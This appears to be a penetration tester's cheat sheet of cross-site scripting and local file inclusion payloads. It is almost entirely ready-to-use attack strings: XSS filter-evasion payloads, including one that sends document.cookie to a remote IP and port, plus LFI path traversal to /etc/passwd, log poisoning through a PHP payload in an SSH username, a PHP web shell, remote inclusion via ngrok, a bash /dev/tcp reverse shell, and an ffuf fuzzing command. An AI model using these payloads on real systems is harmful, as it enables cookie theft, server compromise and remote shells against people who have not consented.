------------------------------------------------------------------cross site scripting------------------------------------------------------------------------
-	<ScRipT>alert("XSS");</ScRipT>
-	<scr<script>ipt>alert(1)</script>
-	<svg/onload=alert(1)>
-	<a href=javascript:confirm()>click here
-	<img src=`xx:xx`onerror=alert(1)>
-	<img src=//x55.is OnError=import(src)>
-	</script><script >alert(document.cookie)</script>
-	<script>new  Image().src="http://10.0.2.10:4444/bogus.php?output="+escape(document.cookie);</script>

To automate the process, use the following tools
-	xsstrike
-	xsshunter
-	BeEF
-	JShell
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------Local File Inclusion----------------------------------------------------------------------------------------------------------------------------------------------------
-	../../../../../../etc/passwd%00.jpg  --> Null Byte will ignore the extension
-	php://filter/convert.base64-encode/resource=
- /roc/self/environ || /var/log/auth.log [ssh log file] || /var/log/apache2/access.log [web server log file]  --> You can poison any of these log files to get a reverse shell
- Ssh “<?php passthru(base64_decode(‘base64PAYLOAD==’))?>”@10.0.2.13 --> poison the auth.log file
- ./ngrok http 9000  && python -m SimpleHTTPServer --> these two are required in order to execute a php file from an external server
- <?php echo system($_GET['cmd']); ?>
- ../../../../../../../../../var/log/apache2/access.log
- bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
- ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> searching for LFI
